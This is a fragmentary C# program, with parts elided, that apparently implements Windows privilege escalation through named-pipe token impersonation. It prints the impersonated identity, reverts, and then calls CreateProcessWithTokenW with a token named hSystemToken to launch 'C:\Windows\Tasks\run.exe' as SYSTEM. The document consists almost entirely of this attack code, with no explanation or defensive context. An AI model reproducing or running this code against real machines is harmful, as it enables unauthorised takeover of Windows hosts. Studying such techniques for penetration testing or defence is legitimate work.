...
DefaultErrorMode = 0x04000000, NewConsole = 0x00000010, NewProcessGroup = 0x00000200, SeparateWOWVDM = 0x00000800,
Suspended = 0x00000004, UnicodeEnvironment = 0x00000400, ExtendedStartupInfoPresent = 0x00080000
}
...
dwPipeMode, uint nMaxInstances, uint nOutBufferSize, uint nInBufferSize, uint nDefaultTimeOut, IntPtr lpSecurityAttributes);
...
static void Main(string[] args) {
	...
	String name = WindowsIdentity.GetCurrent().Name; Console.WriteLine("Impersonated user is: " + name);
	RevertToSelf();
	...
	res = CreateProcessWithTokenW(hSystemToken, (uint)LogonFlags.WithProfile, null, "C:\\Windows\\Tasks\\run.exe", (uint)CreationFlags.UnicodeEnvironment, env, sbSystemDir.ToString(), ref si, out pi);


	Console.WriteLine("ProcessId: " + pi.dwProcessId);
